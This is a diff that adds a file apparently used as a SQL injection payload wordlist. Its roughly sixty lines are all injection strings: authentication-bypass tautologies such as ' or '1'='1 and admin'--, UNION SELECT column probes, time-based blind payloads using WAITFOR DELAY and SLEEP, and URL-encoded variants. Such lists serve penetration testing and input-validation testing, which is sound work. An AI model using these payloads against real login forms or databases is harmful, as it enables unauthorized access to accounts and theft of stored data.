@@ -1,0 +1,64 @@
+' or '1'='1
+' or '1'='1'--
+' or '1'='1' #
+' or '1'='1'/*
+' or 1=1--
+' or 1=1 #
+' or 1=1/*
+admin'--
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or 1=1--
+' or ''='
+' or '=' or '
+' or 'x'='x
+' or 'a'='a
+' or 1 --
+' --
+' #
+' UNION SELECT NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+1' UNION SELECT NULL,NULL--
+admin' UNION SELECT 1--
+' AND '1'='1
+' AND 1=1--
+' AND 'a'='a
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)--
+' OR SLEEP(3)--
+" or "1"="1
+" or "1"="1"--
+admin" or "1"="1
+admin"--
+or 1=1
+or 1=1--
+' or 1=1 LIMIT 1--
+admin')
+admin') or ('1'='1
+admin') or ('1'='1'--
+' OR '1'='1
+' Or '1'='1
+' OR 1=1--
+' IS NULL--
+' IS NOT NULL--
+admin'-- -
+admin'-- -
+
+admin'/**/-
+' or 0x31=0x31--
+%27 or %271%27=%271
+%27 or 1=1--
+' or password LIKE '%
+' or username LIKE 'admin%
+1 or 1=1
+1' or '1'='1
+' or true--
+' or true #
+') or ('1'='1
+') or 1=1--
+')) or (('1'='1
